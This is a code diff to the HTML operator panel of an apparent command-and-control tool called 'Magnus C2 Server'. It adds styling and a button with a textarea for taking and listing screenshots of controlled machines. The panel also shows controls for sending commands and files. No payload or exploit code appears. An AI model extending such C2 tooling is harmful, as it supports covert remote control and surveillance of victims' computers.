@@ -19,10 +19,23 @@
         text-align: center;
     }
 
+    .scroll {
+        scroll-behavior: auto;
+    }
+
     .label {
         font-size: medium;
         font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
         font-weight: bold;
+    }
+
+    .textarea {
+        color: black;
+        font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+        font-size: small;
+        width: 20%;
+        height: 150px;
+        resize: none;
     }
 </style>
 
@@ -34,7 +47,7 @@
     </head>
 
     <body>
-        <div class="center">
+        <div class="center scroll">
             <h1 class="title">Magnus C2 Server</h1>
             <input type="password" id="key" name="key" placeholder="Key">
             <h3 class="title">Command</h3>
@@ -61,6 +74,13 @@
                 <br><br>
                 <input type="submit" class="sendButton" style="background-color: orange;" value="Send Fil!">
             </form>
+            <h3 class="title">Screenshot</h3>
+            <button onclick="takeScreenshot()" class="sendButton" style="background-color: crimson;">Tag
+                screenshot!</button>
+            <br>
+            <label class="label" style="font-weight: normal;">Links til screenshots kommer her:</label>
+            <br>
+            <textarea id="screenshotUrlsArea" name="screenshotUrlsArea" class="textarea"></textarea>
         </div>
 
         <script>
@@ -125,7 +145,7 @@
                     });
             }
 
-            async function takeScreenshots() {
+            async function takeScreenshot() {
                 key = document.getElementById("key").value;
 
                 response = await fetch(`${document.URL}/post_screenshot?key=${key}`,
